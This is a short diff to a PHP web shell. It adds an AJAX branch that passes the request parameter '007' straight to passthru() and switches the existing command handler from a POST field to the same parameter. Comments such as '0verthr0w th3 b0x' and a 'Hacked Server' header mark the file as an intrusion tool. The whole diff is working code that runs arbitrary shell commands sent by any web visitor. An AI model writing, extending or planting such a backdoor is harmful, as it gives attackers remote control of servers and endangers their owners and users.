@@ -35,13 +35,20 @@ function continental_breakfast_is_not_real_breakfast($cmd){
 
 function main(){
 
+	// if this is an AJAX request, then shell exec it and die
+	if(isset($_REQUEST['ajax'])){
+		// header("HTTP/1.1 666 Hacked Server");
+		passthru($_REQUEST['007']." 2>&1");
+		die();
+	}
+
 	// top html
 	echo fuck_abbott(0);
 
 	// if a command is recieved in the POST,
-	if (isset($_POST["whosthere"])) {
+	if (isset($_REQUEST["007"])) {
 		// 0verthr0w th3 b0x
-		continental_breakfast_is_not_real_breakfast($_POST['whosthere']);
+		continental_breakfast_is_not_real_breakfast($_REQUEST['007']);
 	}
 
 	// bottom html
